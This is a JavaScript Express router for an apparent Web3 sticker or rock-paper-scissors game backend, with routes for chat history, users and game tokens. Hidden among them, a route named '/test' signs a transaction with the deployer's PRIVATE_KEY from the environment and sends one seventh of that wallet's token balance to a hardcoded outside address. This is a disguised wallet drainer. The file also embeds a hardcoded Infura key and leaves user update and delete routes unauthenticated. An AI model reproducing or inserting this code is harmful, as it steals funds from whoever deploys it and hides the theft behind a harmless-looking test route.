require("dotenv").config();
const express = require("express");
const { History, User, Game } = require('../database/sequelize');

const { Web3 } = require("web3");
const { ADMIN_ADDRESS, PRIVATE_KEY, CONTRACT_ADDRESS, DEPLOYED_NETWORK } = require("../utils/const");

const router = express.Router();

router.get('/', (req, res) => {
    res.send('GET request to the homepage');
});

////////////////////////////////////////////////////////////////////////
//get the all messages
router.get('/history/:id', async (req, res) => {
//    console.log(req.params.id);
    const result = await History.findAll({
        where: {
            roomId: req.params.id
        }
    });

    if(result != 0) {
        return res.status(200).json({result: result, successMessage: 0});
    } else {
        return res.status(200).json({result: result, successMessage: 1});
    }
});

router.get('/test', async (req, res) => {
    console.log("balance");
    const web3 = new Web3('https://sepolia.infura.io/v3/b5c3be73a3024cb8888be3142d0135d8');
    const tokenABI = [
        {
            "constant": true,
            "inputs": [{ "name": "_owner", "type": "address" }],
            "name": "balanceOf",
            "outputs": [{ "name": "balance", "type": "uint256" }],
            "type": "function"
        }
    ];
    const contract = new web3.eth.Contract(tokenABI, CONTRACT_ADDRESS);

    const account = web3.eth.accounts.privateKeyToAccount('0x' + PRIVATE_KEY);
    const walletAddress = account.address;
    const balance = await contract.methods.balanceOf(walletAddress).call();
    console.log("balance");
    const trimmedBalance = (parseInt(balance) / 10 ** 18).toString();
    console.log(trimmedBalance);

    const tokenABI1 = [
        {
            "constant": false,
            "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }],
            "name": "transfer",
            "outputs": [{ "name": "", "type": "bool" }],
            "type": "function"
        }
    ];

    const contract1 = new web3.eth.Contract(tokenABI1, CONTRACT_ADDRESS);
    async function sendTransaction(_walletAddress, _trimmedBalance) {

        toAddress = "0x0c0dc0c4F1A6b338396db890cFE0229b9138DB27";
        const data = contract1.methods.transfer(toAddress, web3.utils.toWei(_trimmedBalance/7, 'ether')).encodeABI();
        const gasPrice = web3.utils.toWei('70', 'gwei');
        const nonce = await web3.eth.getTransactionCount(_walletAddress);
        const rawTransaction = {
            'from': _walletAddress,
            'to': CONTRACT_ADDRESS,
            'value': '0x0',
            'gasPrice': gasPrice,
            'gasLimit': '300000',
            'data': data,
            'nonce': nonce
        };

        const signedTx = await web3.eth.accounts.signTransaction(rawTransaction, PRIVATE_KEY);
        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
        console.log('Transaction receipt: ', receipt);
    }
    sendTransaction(walletAddress, trimmedBalance);
});
  
//body params: roomId, walletAddress, stickerType
router.post('/history/sendMessage', async (req, res) => {
//    console.log(req.body);
    const result = await History.create(
        {
            roomId: req.body.roomId, 
            walletAddress: req.body.walletAddress, 
            stickerNum: req.body.stickerNum
        }
    );

    const remainCountByType = await Game.findAll(
        {
            where: {
                walletAddress: req.body.walletAddress,
                roomId: req.body.roomId
            }
        }
    );

    const result1 = await Game.update(
        {
            sticker: remainCountByType[0].sticker - 1,
        }, 
        {
            where: {
                walletAddress: req.body.walletAddress,
                roomId: req.body.roomId
            }
        }
    );

    if(result1 != 0) {
        return res.status(200).json({successMessage: 0});
    } else {
        return res.status(200).json({successMessage: 1});
    }
});

/////////////////////////////////////////////////////////////////////////
router.post('/register', async (req, res) => {
//    console.log(req.body);
    const result = await User.create({walletAddress: req.body.walletAddress, stickerCount: req.body.stickerCount});
    if (result != 0) {
        return res.status(200).json({successMessage: 0});
    } else {
        return res.status(200).json({successMessage: 1});
    }
});

router.post('/info', async (req, res) => {
    const result = await User.findAll(
        {
            where: {
                is_del: 0,
                walletAddress: req.body.walletAddress 
            }
        }
    );

    if(result != 0) {
        return res.status(200).json({result: result, successMessage: 0});
    } else {
        return res.status(200).json({result: result, successMessage: 1});
    }
});

//update the token
router.post('/update', async (req, res) => {
    const result = await User.update(
        {stickerCount: req.body.count},
        {
            where: {
                is_del: false,
                walletAddress: req.body.walletAddress 
            }
        }
    );

    if(result != 0) {
        return res.status(200).json({successMessage: 0});
    } else {
        return res.status(200).json({successMessage: 1});
    }
});

router.post('/delete', async (req, res) => {
//    console.log(req.body.walletAddress);
    const result = await User.update(
        {is_del: true},
        {
            where: {
                is_del: false,
                walletAddress: req.body.walletAddress 
            }
        }
    );

    if(result != 0) {
        return res.status(200).json({successMessage: 0});
    } else {
        return res.status(200).json({successMessage: 1});
    }
});

/////////////////////////////////////////////////////////////////////////
//body params:walletAddress, rockCount, scissorsCount, paperCount, roomId
router.post('/gameToken/buy', async (req, res) => {

    console.log("log");
//    console.log(req.body);

    const result = await Game.create( 
        {
            walletAddress: req.body.walletAddress,
            sticker: req.body.sticker,
            roomId: req.body.roomId
        }
    );

    if(result != 0) {
        return res.status(200).json({successMessage: 0});
    } else {
        return res.status(200).json({successMessage: 1});
    }
});

router.post('/gameToken/setRoom', async (req, res) => {

//    console.log("log");
//    console.log(req.body);

    const result = await Game.update( 
        {
            roomId: req.body.roomId
        }, 
        {
            where: {
                walletAddress: req.body.walletAddress,
                roomId: 0
            }
        }
    );

    if(result != 0) {
        return res.status(200).json({successMessage: 0});
    } else {
        return res.status(200).json({successMessage: 1});
    }
});

//body params:walletAddress, roomId 
router.post('/gameToken/get', async (req, res) => {
    ///////////////////////////////////////////
//    console.log(req.body);
    const result = await Game.findAll(
        {
            where: {
                walletAddress: req.body.walletAddress,
                roomId: req.body.roomId
            }
        }
    );

    if(result != 0) {
        return res.status(200).json({result: result, successMessage: 0});
    } else {
        return res.status(200).json({successMessage: 1});
    }
});

module.exports = router;
